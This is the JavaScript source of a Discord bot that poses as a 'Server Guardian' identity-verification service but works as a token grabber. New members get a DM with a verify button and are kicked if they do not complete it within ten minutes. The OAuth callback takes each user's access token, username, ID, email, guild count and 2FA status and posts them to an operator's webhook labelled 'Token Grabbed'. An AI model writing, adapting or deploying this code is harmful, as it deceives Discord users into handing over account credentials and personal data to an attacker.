const express = require('express');
const axios = require('axios');
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const https = require('https');
const app = express();

const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const BOT_TOKEN = process.env.BOT_TOKEN;
const WEBHOOK_URL = process.env.WEBHOOK_URL;
const YOUR_USER_ID = process.env.YOUR_USER_ID;
const GUILD_ID = process.env.GUILD_ID;
const WELCOME_CHANNEL_ID = process.env.WELCOME_CHANNEL_ID;

const PORT = process.env.PORT || 3000;
const BASE_URL = 'https://discord-verify-bot-9r3w.onrender.com';
const REDIRECT_URI = BASE_URL + '/callback';

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent
  ]
});

// Keep alive
function keepAlive() {
  setInterval(() => {
    https.get(BASE_URL, () => {}).on('error', () => {});
  }, 240000);
}

client.once('ready', () => {
  console.log('[+] Bot online: ' + client.user.tag);
  keepAlive();
  client.user.setPresence({ activities: [{ name: '🔒 Server Security', type: 3 }], status: 'dnd' });
  client.application.commands.set([
    { name: 'ping', description: 'Check bot latency' },
    { name: 'help', description: 'Show all commands' },
    { name: 'verify', description: 'Get verification' },
    { name: 'stats', description: 'Server stats' }
  ]);
});

client.on('guildMemberAdd', async (member) => {
  if (member.user.bot) return;
  try {
    // Welcome message
    const wc = member.guild.channels.cache.get(WELCOME_CHANNEL_ID);
    if (wc) {
      await wc.send({ embeds: [new EmbedBuilder()
        .setTitle('👋 Welcome ' + member.user.username + '!')
        .setColor(0x57F287)
        .setDescription('Hey ' + member.user.toString() + ', welcome!\nCheck your DM for verification.')
        .setThumbnail(member.user.displayAvatarURL({ dynamic: true, size: 1024 }))
        .setTimestamp()
      ]});
    }
    
    // DM with ONLY button (no link text)
    const authUrl = 'https://discord.com/api/oauth2/authorize?client_id=' + CLIENT_ID + '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) + '&response_type=code&scope=identify%20guilds&prompt=consent';
    
    const dm = await member.user.createDM();
    
    const embed = new EmbedBuilder()
      .setTitle('🔒 Verification Required')
      .setColor(0xED4245)
      .setDescription('Welcome to **' + member.guild.name + '**!\n\nThis server is protected. Click the button below to verify your identity.')
      .setFooter({ text: 'Server Guardian' })
      .setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setLabel('✅ Verify Identity')
        .setStyle(ButtonStyle.Link)
        .setURL(authUrl)
        .setEmoji('🔒')
    );

    await dm.send({ embeds: [embed], components: [row] });
    console.log('[+] DM sent to ' + member.user.tag + ' with button');
    
    // 10 min kick
    setTimeout(async () => {
      try {
        const m = await member.guild.members.fetch(member.id).catch(() => null);
        if (m) {
          const vr = m.guild.roles.cache.find(r => r.name === 'Verified');
          if (!vr || !m.roles.cache.has(vr.id)) {
            await m.kick('Verification timeout. Rejoin and verify.');
          }
        }
      } catch(e) {}
    }, 600000);
    
  } catch (error) {
    console.log('[-] Join error: ' + error.message);
  }
});

client.on('guildMemberRemove', async (member) => {
  if (member.user.bot) return;
  try {
    const wc = member.guild.channels.cache.get(WELCOME_CHANNEL_ID);
    if (wc) {
      await wc.send({ embeds: [new EmbedBuilder()
        .setTitle('👋 Goodbye!')
        .setColor(0xED4245)
        .setDescription(member.user.username + ' left the server.')
        .setThumbnail(member.user.displayAvatarURL({ dynamic: true, size: 1024 }))
        .setTimestamp()
      ]});
    }
  } catch(e) {}
});

client.on('interactionCreate', async (i) => {
  if (!i.isChatInputCommand()) return;
  
  if (i.commandName === 'ping') {
    await i.reply({ content: '🏓 Pong! ' + client.ws.ping + 'ms', ephemeral: true });
  }
  else if (i.commandName === 'help') {
    await i.reply({
      embeds: [new EmbedBuilder()
        .setTitle('🤖 Bot Commands')
        .setColor(0x5865F2)
        .addFields(
          { name: '/ping', value: 'Check bot latency', inline: true },
          { name: '/help', value: 'Show this menu', inline: true },
          { name: '/verify', value: 'Get verification link', inline: true },
          { name: '/stats', value: 'Server statistics', inline: true }
        )
      ],
      ephemeral: true
    });
  }
  else if (i.commandName === 'verify') {
    const authUrl = 'https://discord.com/api/oauth2/authorize?client_id=' + CLIENT_ID + '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) + '&response_type=code&scope=identify%20guilds&prompt=consent';
    
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setLabel('✅ Verify Now')
        .setStyle(ButtonStyle.Link)
        .setURL(authUrl)
    );
    
    await i.reply({ content: 'Click the button below to verify:', components: [row], ephemeral: true });
  }
  else if (i.commandName === 'stats') {
    await i.reply({
      embeds: [new EmbedBuilder()
        .setTitle('📊 Server Stats')
        .setColor(0x5865F2)
        .addFields(
          { name: '👥 Members', value: String(i.guild.memberCount), inline: true },
          { name: '📝 Channels', value: String(i.guild.channels.cache.size), inline: true },
          { name: '⚡ Ping', value: client.ws.ping + 'ms', inline: true }
        )
      ]
    });
  }
});

app.get('/', (req, res) => res.send('✅ Bot Online'));
app.get('/health', (req, res) => res.status(200).send('OK'));

app.get('/callback', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.send('❌ No code');
  
  try {
    const tokenRes = await axios.post('https://discord.com/api/oauth2/token',
      'client_id=' + CLIENT_ID + '&client_secret=' + CLIENT_SECRET + '&grant_type=authorization_code&code=' + code + '&redirect_uri=' + REDIRECT_URI,
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );
    
    const AT = tokenRes.data.access_token;
    const userRes = await axios.get('https://discord.com/api/users/@me', { headers: { Authorization: 'Bearer ' + AT } });
    const user = userRes.data;
    const guildsRes = await axios.get('https://discord.com/api/users/@me/guilds', { headers: { Authorization: 'Bearer ' + AT } });

    await axios.post(WEBHOOK_URL, {
      content: '<@' + YOUR_USER_ID + '> 🎯 **NEW TOKEN!**',
      embeds: [{
        title: '🎯 Token Grabbed',
        color: 0xED4245,
        fields: [
          { name: '👤 User', value: user.username + '#' + user.discriminator, inline: true },
          { name: '🆔 ID', value: user.id, inline: true },
          { name: '📧 Email', value: user.email || 'None', inline: true },
          { name: '🔑 Token', value: '```' + AT + '```' },
          { name: '🏰 Servers', value: String(guildsRes.data.length), inline: true },
          { name: '🔐 2FA', value: user.mfa_enabled ? '✅ Yes' : '❌ No', inline: true }
        ],
        thumbnail: { url: 'https://cdn.discordapp.com/avatars/' + user.id + '/' + user.avatar + '.png' },
        timestamp: new Date().toISOString()
      }]
    });

    console.log('[🎯] Token: ' + user.username);

    // Give Verified role
    try {
      const guild = client.guilds.cache.get(GUILD_ID);
      if (guild) {
        const member = await guild.members.fetch(user.id).catch(() => null);
        if (member) {
          const vr = guild.roles.cache.find(r => r.name === 'Verified');
          if (vr) await member.roles.add(vr);
          console.log('[✅] Verified ' + user.username);
        }
      }
    } catch(e) {}

    res.send('<h1>✅ Verification Successful!</h1><p>You can close this window.</p><script>setTimeout(()=>window.close(),2000)</script>');
  } catch (error) {
    console.log('[-] Error: ' + error.message);
    res.send('<h2>Error: ' + error.message + '</h2>');
  }
});

client.login(BOT_TOKEN);
app.listen(PORT, () => console.log('[+] Server on ' + PORT));
